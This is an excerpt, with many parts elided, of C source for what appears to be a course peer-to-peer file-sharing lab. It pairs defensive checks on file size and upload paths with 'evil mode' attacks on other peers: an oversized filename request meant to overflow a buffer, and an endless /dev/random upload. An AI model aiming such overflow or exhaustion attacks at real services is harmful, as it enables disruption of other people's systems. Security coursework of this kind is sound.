...
//  
//
//  Created by Li-Wei Tseng on 5/31/15.
//
//
...
#define MAXUPLOADSIZE 104857600 //limit max file size to 100 MB
...
static void do_filename_overrun_attack(task_t *overrun_task)
{
    ...
    while (overrun_task->peer_list!=0) {
        ...
        osp2p_writef(overrun_task->peer_fd, "GET \
                     ...
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbhellobbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbcanyoubbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbfindbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbmebbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb\
                     bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb OSP2P\n");
...
static void task_download(task_t *t, task_t *tracker_task)
{
    ...
    while (1) {
        ...
        if (t->total_written > MAXFILESIZ){
            error("* Written file size too large");
            goto try_again;
        }
        // End of 2B code
        
        ///////////////////////////////////////////
        //Exercise 3 START infinite data download
        ///////////////////////////////////////////
        ...
        ///////////////////////////////////////////
        //Exercise 3 END infinite data download
        ///////////////////////////////////////////
    }
...
static void task_upload(task_t *t)
{
    ...
    ////////////////////////////////////////////////////////////////////////
    //Exercise 3 START Infinite data upload
    ////////////////////////////////////////////////////////////////////////
    if (evil_mode==3)
        t->disk_fd = open("/dev/random", O_RDONLY);
    ////////////////////////////////////////////////////////////////////////
    //Exercise 3 END Infinite data upload
    ////////////////////////////////////////////////////////////////////////
    ...
    // 2B: Constrain to current directory only
    char cur_dir[PATH_MAX], file_path[PATH_MAX];
    ...
    if (strcmp(cur_dir, file_path)) {
        error("* Must not upload files outside current directory");
    }
    // End of 2B code
...
argprocess:
    ...
    for (; argc > 1; argc--, argv++) {
        if ((t = start_download(tracker_task, argv[1]))) {
            ...
            if (pid == 0) {
                ...
                error("* Failed to parallelize download");
        }
    }
    ...
    }else if(evil_mode==2)
    {
        ...
        while ((t = task_listen(listen_task))){
            ...
            if (pid==0) {
                ...
                error("Error: cannot forking during upload\n");
            }
        }
    }
    //////////// EXERCISE 3 START Attack //////////    
    ...
    while ((t = task_listen(listen_task))) {
        ...
        if (pid == 0) {
            ...
            error("* Failed to parallelize upload");
    }
